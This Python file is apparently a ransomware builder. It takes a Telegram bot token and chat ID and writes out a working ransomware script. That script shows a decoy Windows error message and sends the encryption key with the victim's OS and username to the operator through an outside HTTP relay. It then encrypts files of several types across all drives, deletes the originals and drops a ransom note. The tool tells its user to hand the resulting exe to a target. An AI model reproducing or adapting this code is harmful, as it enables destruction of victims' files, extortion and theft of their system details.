import sys
import time
import banner
from colorama import Fore
def create():
    banner.banner()
    print(Fore.RED+"""\n [!] Welcome To The Ransomware Maker Part\n
 [!] Please Enter The Telegram bot Token && Your User ID\n""")
    try:

        print(Fore.RED+"\n [!] "+Fore.BLUE+" This Tool Send The Key Of Encrypt To Your Bot And Make Exe File And You Should Give It To Your Target ")
        time.sleep(0.3)
        token = input(Fore.RED+"\n [!] Enter Your Bot Token : ")
    except KeyboardInterrupt:
        print("")
        sys.exit()
    try:
        banner.banner()
        chat = input(Fore.YELLOW+"\n [!] Enter Your Chat Id In Telegram : ")
        time.sleep(0.3)
    except KeyboardInterrupt:
        print("")
        sys.exit()


    path = ('''
# -*- coding: UTF-8 -*-
from cryptography.fernet import Fernet
from subprocess import check_output
from os import remove
import requests
import platform
import os
import getpass
import ctypes
from win10toast import ToastNotifier

def errnot():
    toaster = ToastNotifier()
    toaster.show_toast("The All Of File Encrypted","Place Check The File /Desktop/Lock.txt",icon_path="../icon/hacked.ico")


def errmsg():
    messageBox = ctypes.windll.user32.MessageBoxW

    returnValue = messageBox(0,"This verison of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) verion of the program","ERROR",0x10 | 0x0)



def msg():
    path = os.path.expanduser("~")+"\Desktop"
    f = open(path+"\Locked.txt","w")
    f.write("""message : You Are Hacked Bro :)
Give The Key For Decrypt Your File Of The People Who Send You This Ransomware
    
    """)
    f.close()

def drive_finer():
    #Start Generate Key
    key = Fernet.generate_key()
    Encrypt = Fernet(key)
    #End Generate Key
    #-------------------------
    hi = ("Key : "+str(key)+"------------"+"Os Name : "+platform.uname()[0]+"------------"+"Version : "+platform.uname()[2]+"------------"+"Username : "+getpass.getuser())
    #Start Send Key in Telegram Bot
    url = ("https://api.telegram.org/bot%s/sendmessage?chat_id=%s&text="+str(hi))

    payload = {"UrlBox":url,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
    #End Send Key Telegram bot
    drive = ["D:","H:","S:","X:","G:","C:","F:","E:"]
    target_drive = []
    cmd = check_output("fsutil fsinfo drives",shell=True)
    for i in drive:
        if i in str(cmd):
            target_drive.append(i)
    print(target_drive)

    pasvand = ["exe","png","jpg","jpeg","psd","py","txt"]
    # for p in pasvand:
    #     try:
    #         with open("log", 'w') as errlog:
    #             cmd1 = check_output("cd / && dir /S /B *."+p,shell=True,stderr=errlog)
    #             ddm1 = cmd1.decode().replace(" ","")
    #             for v in ddm1.split():
    #                 with open(v,"rb") as dirlist: 
    #                         data = dirlist.read()
    #                         enc_data = Encrypt.encrypt(data)
    #                         new_file = open(v+"[encrypted]","wb")
    #                         new_file.write(enc_data)
    #                         dirlist.close()
    #                         new_file.close()
    #                         os.remove(v)
    #                         print(v+ " ----- >  "+"  [Encrypted] ")
        # except:
        #     pass

    for d in target_drive:
        for p in pasvand:
            try:
                with open("log", 'w') as errlog:
                    cmd2 = check_output(d+" && dir /S /B *."+p,shell=True,stderr=errlog)
                    ddm2 = cmd2.decode()
                    for g in ddm2.split():
                            with open(g,"rb") as dirlist: 
                                data = dirlist.read()
                                enc_data = Encrypt.encrypt(data)
                                new_file = open(g+".ToJa","wb")
                                new_file.write(enc_data)
                                dirlist.close()
                                new_file.close()
                                os.remove(g)
                                print(g+ " ----- >  "+"  [Encrypted} ")                                                   
            except:
                pass
errmsg()               
drive_finer()
msg()
errnot()
'''%(token,chat))

    f = open("../modules/encrypt.py","w")
    f.write(path)
    f.close()
    print(Fore.GREEN+"\n [+]"+Fore.RED+" Place Wait...")
